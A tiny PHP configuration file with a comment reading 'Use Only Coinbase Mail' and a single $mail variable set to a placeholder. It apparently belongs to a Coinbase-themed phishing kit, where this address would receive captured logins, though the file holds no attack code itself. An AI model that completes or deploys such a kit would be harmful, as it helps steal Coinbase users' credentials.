<?php
//Use Only Coinbase Mail

$mail = "#########";

?>